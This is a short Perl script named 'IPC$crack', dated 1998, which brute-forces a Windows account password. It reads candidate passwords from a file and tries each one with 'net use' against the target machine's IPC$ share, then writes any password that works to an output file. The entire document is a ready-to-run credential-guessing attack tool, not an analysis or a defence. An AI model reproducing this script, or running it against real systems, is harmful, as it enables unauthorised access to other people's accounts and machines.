#
# IPC$crack
# Created by Mnemonix 1st of May 1998
#

$victim = $ARGV[0]; 
$user = $ARGV[1];

open (OUTPUT, ">net.txt");
open (PASSWORD, "password.txt");

$passwd = <PASSWORD>;

while ($passwd ne "")
	{
		chop ($passwd);
		print ("net use \\\\$victim\\ipc\$ $passwd /user:$user");
		$line = system ("net use \\\\$victim\\ipc\$ $passwd /user:$user");
		if ($line eq "0")
			{ 
			print OUTPUT ("$user\'s password on $victim is $passwd.");
			$passwd="";
			}
		else
		{
		$passwd = <PASSWORD>;
		if ($passwd eq "")
			{
			print OUTPUT ("Not cracked.");
			}
		}
	}

